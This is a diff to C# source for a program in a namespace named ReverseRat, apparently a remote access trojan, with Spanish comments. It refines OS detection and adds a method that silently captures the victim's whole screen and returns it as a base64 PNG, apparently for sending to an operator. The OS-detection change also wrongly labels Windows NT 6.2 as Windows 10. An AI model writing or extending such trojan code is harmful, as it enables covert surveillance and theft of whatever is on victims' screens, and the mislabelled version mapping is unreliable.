@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Drawing;
 using System.IO;
 using System.Net;
 using System.Reflection;
@@ -106,7 +107,7 @@ namespace ReverseRat
        {
            OperatingSystem osInfo = Environment.OSVersion;
            string os = osInfo.ToString();
-           string sistema = "Windows";
+           string sistema = os;
            try
            {
                if (os.Contains("Microsoft Windows NT 5.1.2600"))
@@ -157,7 +158,11 @@ namespace ReverseRat
                {
                    sistema = (os.Replace("Microsoft Windows NT 6.1.7600", "Windows 7"));
                }
-           }
+               if (os.Contains("Microsoft Windows NT 6.2"))
+               {
+                    sistema = (os.Replace("Microsoft Windows NT 6.2", "Windows 10"));
+               }
+            }
            catch (Exception k)
            {
                sistema = ("Unknown OS");
@@ -170,7 +175,7 @@ namespace ReverseRat
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
-           char ch;
+           char ch; 
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
@@ -189,6 +194,32 @@ namespace ReverseRat
         {
             HashServer = cadHash;
         }
+
+
+       public  string CapturarPantalla()
+        {
+            string base64String;
+            // Obtener el tamaño de la pantalla
+            var screenBounds = Screen.PrimaryScreen.Bounds;
+            // Crear un bitmap con el tamaño de la pantalla
+            var bitmap = new Bitmap(screenBounds.Width, screenBounds.Height);
+            // Crear un objeto Graphics a partir del bitmap
+            var graphics = Graphics.FromImage(bitmap);
+            // Copiar la pantalla en el objeto Graphics
+            graphics.CopyFromScreen(0, 0, 0, 0, screenBounds.Size);
+            // Crear un MemoryStream para guardar la imagen
+            using (var stream = new MemoryStream())
+            {
+                // Guardar la imagen en el MemoryStream en formato PNG
+                bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
+                // Crear un arreglo de bytes con los datos del MemoryStream
+                var imageBytes = stream.ToArray();
+                base64String = Convert.ToBase64String(imageBytes);
+                Console.WriteLine("Captura de pantalla guardada");
+            }
+            return base64String;
+        }
+
 
 
 
